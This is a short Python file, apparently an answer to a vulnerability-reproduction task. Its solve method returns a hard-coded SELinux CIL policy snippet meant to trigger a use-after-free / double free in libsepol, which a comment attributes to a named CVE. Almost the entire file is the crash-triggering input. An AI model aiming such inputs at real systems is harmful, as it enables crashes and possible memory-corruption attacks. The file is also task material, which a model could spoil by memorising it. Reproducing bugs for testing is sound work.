import os
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC exploits CVE-2024-28182 - heap use-after-free in libsepol/cil
        # The vulnerability occurs when an anonymous classpermission is passed to
        # a macro that uses a classpermissionset rule, causing double free during AST destruction
        poc = b"""(type t)
(type t2)
(roletype r t)
(class c)
(permission p)
(classpermission cp)
(classpermissionset cp (p))
(classpermissionset (classpermission ) (p))
(macro m () (allow t t2 (classpermissionset cp (p))))
(block b
    (macro m2 (x) (allow t t2 (classpermissionset (classpermission ) (p))))
    (m2 ())
)
(m)
"""
        return poc
